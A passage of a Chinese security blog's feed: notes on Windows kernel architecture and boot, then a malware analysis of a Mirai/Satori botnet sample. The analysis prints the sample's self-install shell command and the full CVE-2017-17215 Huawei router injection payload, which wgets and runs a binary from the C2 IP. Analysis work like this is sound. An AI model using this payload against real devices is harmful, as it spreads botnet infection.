DDK</code>中有文档。</li><li>执行体之间内部调用，未被文档化的函数</li><li>一个组件的内置函数</li></ul><p>其中组件包括</p><ul><li>进程和线程管理器：负责进程/线程的CURD</li><li>内存管理：虚拟内存</li><li>安全引用监视器（SRM）：维护本地计算机的安全策略</li><li>I/O管理器</li><li>缓存管理器：允许磁盘将文件映射到内存中</li><li>配置管理器：负责注册表的实现</li><li>即插即用管理器</li></ul><p>还有的函数负责对执行体进行管理</p><ul><li>对象管理器：执行体对象的CURD</li><li>LPC设施：负责同一设备的的客户进程和服务进程的消息传递，对应的是远程过程调用（RPC）</li><li>运行时库函数</li><li>执行体支持例程：内存的分配、互锁内存的转换</li></ul><h2 id="设备驱动程序"><a class="markdownIt-Anchor" href="#设备驱动程序"></a> 设备驱动程序</h2><p>驱动文件（<code>.sys</code>），漏洞挖掘存在于<code>IOCTL</code></p><h2 id="文件系统存储管理"><a class="markdownIt-Anchor" href="#文件系统存储管理"></a> 文件系统/存储管理</h2><p>主要是<code>ntfs.sys</code>。漏洞挖掘存在于<code>CLFS</code>（通用日志文件系统）。</p><h2 id="网络"><a class="markdownIt-Anchor" href="#网络"></a> 网络</h2><p>windows套接字、winInet、NetBIOS、RPC</p><h1 id="iii-windows子系统"><a class="markdownIt-Anchor" href="#iii-windows子系统"></a> III. windows子系统</h1><p>在上面的内核部分已经实现了对硬件的简单访问控制，那么就会在次基础上进行跟高层次的建设。</p><p>在PE文件的头部域<code>Subssytem</code>中指定了该程序会在那个子环境中运行。</p><p>子系统也分为用户模式和内核模式，<strong>核心部分是 win32k.sys</strong>。子系统的DLL链接到应用程序中，包括<code>kernel32.dll</code> <code>user32.dll</code> <code>gdi32.dll</code> <code>advapi.dll</code>，负责实现文档化的windows函数。</p><p>win32k.sys同时也负责向内核注入一系列出调函数(callout)，一旦调用了win32k.sys的任何一个系统服务，这个程序就会变成一个GDI线程</p><p>核心功能可以分为：</p><ul><li><p>窗口管理</p><p>由windows子进程<code>csrss.exe</code>负责控制台窗口功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">子系统会话---&gt;交互式窗口站---&gt;默认桌面---&gt;顶级窗户口列表-&gt;子窗口</span><br><span class="line">          |             |_&gt;登录窗口</span><br><span class="line">          |             |_&gt;屏幕保护窗口</span><br><span class="line">          |-&gt;非交互式窗口--&gt;不可见桌面</span><br></pre></td></tr></table></figure></li><li><p>图形设备接口(GDI)</p><p>主要是图形支持，设计Direct3D等</p></li></ul><h1 id="iv-安全性管理"><a class="markdownIt-Anchor" href="#iv-安全性管理"></a> IV. 安全性管理</h1><p>三个核心组件：<strong>winlogon</strong>、<strong>SRM</strong> 和 <strong>lsass</strong></p><p>winlogon 和 lsass 是两个用户模式进程， 而 SRM 是 Windows 执行体中的组件</p><p><img src="https://img.joe1sn.top/uploads/big/9af8f1b52745a7587e3e81ae3a156eaf.png" alt="image-20230601094755027" /></p><ul><li>SRM（Security Reference Monitor安全引用监视器），负责执行对象的安全访问检查、管理用户特权、生成安 全审计消息，并且定义了访问令牌数据结构来表示一个安全环境。</li><li>Winlogon，负责响应 SAS（安全注意序列），以及管理交互式登录会话。当用户登 录到系统中时，winlogon 创建一个初始进程，并进一步由它创建外壳（shell）进程。</li><li>Lsass（Local Security Authentic SubSystem本地安全权威子系统），负责本地系统的安全策略，同时，它也认证用户的 身份，以及将安全审计消息发送到系统的事件日志中。</li><li>SAM（安全账户管理器）数据库，包含了本地用户和用户组，以及它们的口令和其 他属性。它位于注册表的 HKLM\SAM 下面。由于 HKLM\SAM 键只允许本地系统账 户访问，所以，除非用户在 Local System 账户下运行 regedit.exe 工具，否则无法访问 HKLM\SAM 子树。</li><li>LSA 策略数据库，包含了有关当前系统的一些信息，譬如谁允许访问系统以及如何 访问（交互式登录、网络登录或者以服务方式登录）；分配给谁哪些特权；安全审计 如何进行等。如同 SAM 数据库一样，LSA 策略数据库也存储在注册表中，位于 HKLM\SECURITY 下面。同样地，除了 Local System 账户以外的其他账户均无法访 问 HKLM\SECURITY 子树。</li></ul><p>winlogon 负责<strong>系统登录</strong>，包括对用户身份的认证；<strong>lsass 负责管理系统本地安全策略</strong>，并且将这些策略通知到内核中的 SRM。在内核 中，SRM 负责实现基于对象的访问控制以及系统全局安全策略的实施。</p><h2 id="关于一些提权"><a class="markdownIt-Anchor" href="#关于一些提权"></a> 关于一些提权</h2><p>在 Windows 中，特权是由 LUID 对象来标识的，LUID 代表一个本地唯一标识符（Locally  Unique Identifier）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LUID_AND_ATTRIBUTES</span> &#123;</span> </span><br><span class="line"> LUID Luid; </span><br><span class="line"> ULONG Attributes; </span><br><span class="line"> &#125; LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES; </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_ENABLED (0x00000002L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_REMOVED (0X00000004L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_USED_FOR_ACCESS (0x80000000L)</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/5b43b7eea8f959062d9d429d24c4b7ef.png" alt="image-20230601100327861" /></p><p>Windows 内核中定义了一组特权，即类型为 LUID 的 Se全局变量。Windows 内核中，与安全相关的函数以“Se”作为前缀，有一些安全函数还存在对应的系 统服务。这些系统服务函数的名称以“Nt”作为前缀，后面部分与“Se”函数相同。</p><h1 id="v-windows的引导过程"><a class="markdownIt-Anchor" href="#v-windows的引导过程"></a> V. Windows的引导过程</h1><p>最开始也是从经典的MBR开始，然后是ntldr的osloader。</p><p>在osloader中将物理地址转为虚拟地址，该过程可见：windows_kernel_driver_2中对CR3、CR4寄存器的控制。</p><p>之后osloader加载NTDETECT.COM程序，利用系统BIOS查询系统基本设备，在引导过程的后期被存放到注册表 HKLM\HARDWARE\DESCRIPTION</p><p>os loader 加载内核模块映像文件，默认为 ntoskrnl.exe，以及 HAL 映像文件，默 认为 hal.dll。再加载注册表的 SYSTEM 储巢，即\WINDOWS\system32\config\system 文件。</p><p><img src="https://img.joe1sn.top/uploads/big/1b982f19ef122b020f794aa867004e2b.png" alt="image-20230601100916238" /></p><p>然后是内核的初始化，此入口函数为 <code>KiSystemStartup</code></p><p>为了解决在初始化过程中的相互依赖 性问题，内核的初始化分两个阶段进行，称为阶段 0 和阶段 1。大多数内核组件的初始化函 数相应地带有一个整数参数，以指明一次调用是阶段 0 初始化还是阶段 1 初始化，而有些组 件的初始化函数通过检查一个全局变量 InitializationPhase 的值来判断当前处于哪个阶段。</p><p>阶段 0 初始化的目的是，将阶段 1 初始化所要用到的基 本数据结构建立起来。这时中断被禁止，调整IDT、TSS、PCR等。接着调用 KiInitializeKernel 函数，执行内核初始化。最后，当前线程蜕变成一个空闲线程。</p><p><img src="https://img.joe1sn.top/uploads/big/37b5a3335cbcb32366e40e7111162964.png" alt="image-20230601101312886" /></p><h1 id="v-windows发布历史"><a class="markdownIt-Anchor" href="#v-windows发布历史"></a> V. Windows发布历史</h1><p>MicroSoft在操作系统领域中最开始起源于MS-DOS，随后演变出了两个分支，最开始的<code>Win 95/98/Me</code>，之后就是基于<code>Windows NT</code>的内核版本的<code>Window XP/7/8/10/vista</code>的版本。</p><table><thead><tr><th>版本</th><th>发布日期</th><th>主要特点</th><th>内核版本</th></tr></thead><tbody><tr><td>Windows 1.0</td><td>1985年11月</td><td>初始版本，提供基本的图形用户界面和应用程序支持</td><td>1.0</td></tr><tr><td>Windows 2.0</td><td>1987年12月</td><td>引入了窗口重叠、图标和键盘快捷键等改进</td><td>2.0</td></tr><tr><td>Windows 3.0</td><td>1990年5月</td><td>支持多任务处理和TrueType字体，用户界面大幅改进</td><td>3.0</td></tr><tr><td>Windows 95</td><td>1995年8月</td><td>具有开始菜单、任务栏和32位应用程序支持的重要版本</td><td>4.0</td></tr><tr><td>Windows 98</td><td>1998年6月</td><td>引入了对USB设备和DVD光盘的支持，改进了系统稳定性</td><td>4.10</td></tr><tr><td>Windows 2000</td><td>2000年2月</td><td>强化了系统稳定性和安全性，提供了企业级特性</td><td>5.0</td></tr><tr><td>Windows XP</td><td>2001年10月</td><td>引入了全新的用户界面、系统恢复功能和多用户支持</td><td>5.1</td></tr><tr><td>Windows Vista</td><td>2007年1月</td><td>全新的用户界面、更高的安全性和系统稳定性</td><td>6.0</td></tr><tr><td>Windows 7</td><td>2009年10月</td><td>优化了用户界面和性能，改进了任务栏和窗口管理</td><td>6.1</td></tr><tr><td>Windows 8</td><td>2012年10月</td><td>引入了全新的开始屏幕和触摸优化的用户界面</td><td>6.2</td></tr><tr><td>Windows 10</td><td>2015年7月</td><td>统一了桌面和移动设备平台，引入了Windows应用商店</td><td>10.0</td></tr><tr><td>Windows 11</td><td>2021年10月</td><td>新的用户界面设计、改进的性能和安全性，支持Android应用</td><td>10.0</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows系统结构还有引导过程&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Mirai Botnet分支Satori分析</title>
    <link href="https://joe1sn.eu.org/2023/03/25/mirai-bota/"/>
    <id>https://joe1sn.eu.org/2023/03/25/mirai-bota/</id>
    <published>2023-03-25T10:42:45.000Z</published>
    <updated>2023-06-01T14:29:56.735Z</updated>
    
    <content type="html"><![CDATA[<p>暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向</p><span id="more"></span><h2 id="基本情况"><a class="markdownIt-Anchor" href="#基本情况"></a> 基本情况</h2><table><thead><tr><th>名称</th><th>x86_64</th></tr></thead><tbody><tr><td>MD5</td><td>fe7ca3b588e342f79c7814bb75dc24d7</td></tr><tr><td>SHA256</td><td>e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978</td></tr><tr><td>Domain</td><td><a href="http://botnet.nguyennghi.info">botnet.nguyennghi.info</a></td></tr><tr><td>ip</td><td>103.183.118.73</td></tr></tbody></table><h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2><h3 id="基本情况-2"><a class="markdownIt-Anchor" href="#基本情况-2"></a> 基本情况</h3><img src="https://img.joe1sn.top/uploads/big/2dd85cc12949bcd1a7da5287ada77fed.png" alt="image-20230319130912500" style="zoom:50%;" /><p>64位ELF可执行文件</p><p><img src="https://img.joe1sn.top/uploads/big/ff35ebac2e5f17da95a18f650aa1c5f6.png" alt="image-20230319131036258" /></p><h3 id="逆向工程"><a class="markdownIt-Anchor" href="#逆向工程"></a> 逆向工程</h3><p>通过start找到main函数</p><p><img src="https://img.joe1sn.top/uploads/big/7f9086994f2d20a717a754d858293a59.png" alt="image-20230319131156050" /></p><p>使用IDApython脚本对类似的库函数实现进行函数重命名</p><p><img src="https://img.joe1sn.top/uploads/big/6ae388e053568f7e0b6209cf80082bbd.png" alt="image-20230319131304684" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">    func = idaapi.get_func(func_ea)</span><br><span class="line">    name = idaapi.get_func_name(func_ea)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> head <span class="keyword">in</span> idautils.Heads(func.start_ea, func.end_ea):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = idc.GetDisasm(head)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;syscall&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Function: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name).ljust(<span class="number">0x40</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">                <span class="built_in">print</span>(code[<span class="number">21</span>:].ljust(<span class="number">0x30</span>,<span class="string">&quot;=&quot;</span>))</span><br><span class="line">                ida_name.set_name(func.start_ea, code[<span class="number">21</span>:])</span><br><span class="line">                idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/9699218d050e3277b97c149a5001e218.png" alt="image-20230319131712988" /></p><p><strong>main函数</strong></p><ol><li><p>首先创建向<code>8.8.8.8:13568</code>的socket连接，通过<code>getsockname</code>测试网络是否连通并获得本机ip地址</p><p><img src="https://img.joe1sn.top/uploads/big/e1856f6f33f0c1ef5976e312ad0722e2.png" alt="image-20230319133229045" /></p></li><li><p>初始化加密消息</p><p>由于使用未知版本的lib库进行静态编译，所以需要手动识别一些lib函数。</p><p>比如这里使用<code>malloc</code>分配并将密文使用<code>strncpy</code>将消息复制到堆中</p><p><img src="https://img.joe1sn.top/uploads/big/7058438640f17abd7da5ae8736403663.png" alt="image-20230319145038585" /></p></li><li><p>利用<code>pid</code>和随机数进行随机数生成，对进程进行随机改名</p><ul><li><p>将time生成的伪随机数和pid进行异或等操作得到随机数</p><p><img src="https://img.joe1sn.top/uploads/big/c3fa4dc9012d5d9d226257bc0a7ad6e8.png" alt="image-20230319145721197" /></p></li><li><p>通过位移等操作实现随机数的范围控制</p></li></ul><p><img src="https://img.joe1sn.top/uploads/big/c16e53f2ec6c8b3dd41d531f26f25633.png" alt="image-20230319145655202" /></p><ul><li><p>在之后使用<code>ptrcl</code>进行进程的重命名</p><p><img src="https://img.joe1sn.top/uploads/big/f9ee442f2eb39f67156721672c18f159.png" alt="image-20230319164552839" /></p></li></ul></li><li><p>拼接指令过后，修改相关信号变量值，并在<code>vfork</code>的<code>execl</code>中执行</p><ul><li><p>拼接命令字符串</p><p><img src="https://img.joe1sn.top/uploads/big/e8dc6791e9c8617b59761f5d15e5999c.png" alt="image-20230319164254112" /></p></li><li><p>设置信号量并使用vfork执行</p><p><img src="https://img.joe1sn.top/uploads/big/69316bf83fad9f326f58e874975dd2e6.png" alt="image-20230319164122065" /></p><p><img src="https://img.joe1sn.top/uploads/big/16fb3f0838f0cffc01c01207cb1f8c5c.png" alt="image-20230319163508664" /></p></li><li><p>vfork部分</p><p><img src="https://img.joe1sn.top/uploads/big/268aff2f4a3d3e64a33004ceef665ca9.png" alt="image-20230319164454462" /></p></li><li><p>执行的语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \336\377\377\377\177; &gt;bin/watchdog &amp;&amp;  mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog</span><br></pre></td></tr></table></figure><ol><li>随机选择  <code>&quot;/bin/busybox&quot;;</code>、<code>&quot;/bin/watchdog&quot;</code>、<code>&quot;/bin/systemd&quot;</code>中的一个（<code>$root_random_name</code>）中的一个<strong>删除</strong></li><li>当前文件夹创建<code>bin</code>目录</li><li>将当前目录下的病毒移动至创建的<code>bin</code>目录中，并重命名<code>$root_random_name</code></li><li>给予<code>bin/$root_random_name</code>最高权限</li></ol><p>通过多次运行可以成功实现，如果<code>&amp;&amp; mkdir bin \336\377\377\377\177</code>中没有乱码，那么就会执行后一句</p><p><img src="https://img.joe1sn.top/uploads/big/e6955edfd176db8c53e504286d3be6d7.png" alt="image-20230319230512195" /></p></li></ul></li><li><p>使用异或解密字符串并打印，完成后加密字符串</p><ul><li><p>过程</p><p><img src="https://img.joe1sn.top/uploads/big/2cf1740082e2104f5c6be1f730334279.png" alt="image-20230319173516052" /></p></li><li><p>利用其自身的解密脚本，可以解密所有密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">str1 = [ <span class="number">0x4C</span>, <span class="number">0x41</span>, <span class="number">0x5A</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x48</span>, <span class="number">0x41</span>, <span class="number">0x2E</span>]</span><br><span class="line">str2 = [<span class="number">0x4A</span>, <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>]</span><br><span class="line">str3 = [<span class="number">0x01</span>, <span class="number">0x5E</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, <span class="number">0x2E</span>]</span><br><span class="line">str4 = [<span class="number">0x01</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line">str5 = [<span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x4A</span>, <span class="number">0x2E</span>]</span><br><span class="line">str6 = [<span class="number">0x01</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x4A</span>, <span class="number">0x42</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x4B</span>, <span class="number">0x2E</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="number">0x6D53D2C2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher:<span class="built_in">list</span></span>):</span><br><span class="line">    v3 = key &amp; <span class="number">0xFF</span></span><br><span class="line">    v4 = key &gt;&gt; <span class="number">8</span></span><br><span class="line">    v5 = (key &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    v6 = (key &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        result += <span class="built_in">chr</span>((i^v3^v4^v5^v6 )&amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>, decrypt(str1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2&quot;</span>, decrypt(str2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;3&quot;</span>, decrypt(str3))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;4&quot;</span>, decrypt(str4))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;5&quot;</span>, decrypt(str5))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6&quot;</span>, decrypt(str6))</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/23f89924f7290216402f2dbee10c1f43.png" alt="image-20230319220907909" /></p></li><li><p>加密字符串，由于是异或加密，所以加解密算法一致</p></li></ul></li></ol><p><img src="https://img.joe1sn.top/uploads/big/603b9a71f69d32f0b9937d4c40d4e2eb.png" alt="image-20230319174504355" /></p><p><img src="https://img.joe1sn.top/uploads/big/8c79bfcbe91463df2c3555e3de8b40d0.png" alt="image-20230319174521783" /></p><ol start="6"><li><p>合适函数表，讲函数放到一个table中</p><p><img src="https://img.joe1sn.top/uploads/big/6e49a88320fb86ab46e96687914965bd.png" alt="image-20230325174924309" /></p></li><li><p>使用<code>fork</code>获得子进程，打开<code>/proc</code>文件夹并读取其中的文件，关闭除必要进程外的所有进程</p><ul><li><p>打开<code>/proc/</code>文件夹</p><p><img src="https://img.joe1sn.top/uploads/big/fc58ad13d588c9c5bfd0718b076a8ec8.png" alt="image-20230325175147772" /></p><p><img src="https://img.joe1sn.top/uploads/big/c52029cd2018a1d2b7c8cd50bfb58c4b.png" alt="image-20230325175200591" /></p></li><li><p>关闭除必要进程外的所有进程</p><p><img src="https://img.joe1sn.top/uploads/big/f6c419b41761495db52182270509e87f.png" alt="image-20230325175235928" /></p></li></ul></li><li><p>使用SSDP协议进行网络发包，使用华为HG532远程命令执行漏洞（CVE-2017-17215）的payload进行发包，进行攻击</p><ul><li><p>进行攻击</p><ol><li><p>创建socket</p><p><img src="https://img.joe1sn.top/uploads/big/82f418b30b12d5cd5f0340a65dacecd5.png" alt="image-20230325175953274" /></p></li><li><p>设置 socket 选项，允许向组播地址发送数据</p><p><img src="https://img.joe1sn.top/uploads/big/5df10655306d34b61114564c0e610cf9.png" alt="image-20230325181258334" /></p></li><li><p>设置目标地址和端口号</p><p><img src="https://img.joe1sn.top/uploads/big/5fdd3eff4830d76f22e248fac58f4c1c.png" alt="image-20230325181453140" /></p></li><li><p>构造 M-SEARCH 请求报文，发送搜索请求</p><p><img src="https://img.joe1sn.top/uploads/big/f6ec95904237a3f131f02eb4eed5db82.png" alt="image-20230325175636859" /></p><p><img src="https://img.joe1sn.top/uploads/big/1a9561f1e58f0b6efcd84e98fa54dad6.png" alt="image-20230325175725576" /></p><p><img src="https://img.joe1sn.top/uploads/big/3331ad455db311c3c1ae6f49c223d273.png" alt="image-20230325175739448" /></p></li></ol></li><li><p>payload分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /ctrlt/DeviceUpgrade_1 HTTP/1.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: */*</span><br><span class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e</span><br><span class="line">3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line">Content-Length: 457</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">    &lt;s:Body&gt;</span><br><span class="line">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line">        &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt;</span><br><span class="line">        &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;</span><br><span class="line">        &lt;/u:Upgrade&gt;</span><br><span class="line">    &lt;/s:Body&gt;</span><br><span class="line">&lt;/s:Envelope&gt;</span><br></pre></td></tr></table></figure><p>核心语句</p><p><code>/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei</code></p></li></ul></li></ol><h2 id="网络连接相关"><a class="markdownIt-Anchor" href="#网络连接相关"></a> 网络连接相关</h2><h3 id="dns-server"><a class="markdownIt-Anchor" href="#dns-server"></a> DNS SERVER</h3><table><thead><tr><th><a href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a>.</th><th>173.245.59.65 <a href="http://anuj.ns.cloudflare.com">anuj.ns.cloudflare.com</a></th><th>CLOUDFLARENET United States</th></tr></thead><tbody><tr><td><a href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a>.</td><td>108.162.194.192 <a href="http://raphaela.ns.cloudflare.com">raphaela.ns.cloudflare.com</a></td><td>CLOUDFLARENET United States</td></tr></tbody></table><h3 id="host-records-a"><a class="markdownIt-Anchor" href="#host-records-a"></a> Host Records (A)</h3><table><thead><tr><th><a href="http://nguyennghi.info">nguyennghi.info</a>    HTTP: cloudflare</th><th>104.21.78.122</th><th>CLOUDFLARENET unknown</th></tr></thead><tbody><tr><td><a href="http://antiddos.nguyennghi.info">antiddos.nguyennghi.info</a></td><td>103.161.181.140</td><td>DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam</td></tr><tr><td><a href="http://checkht4gvpn.nguyennghi.info">checkht4gvpn.nguyennghi.info</a>    <br>HTTP: cloudflare</td><td>172.67.220.248</td><td>CLOUDFLARENET United States</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="git" scheme="https://joe1sn.eu.org/tags/git/"/>
    
  </entry>
  
</feed>
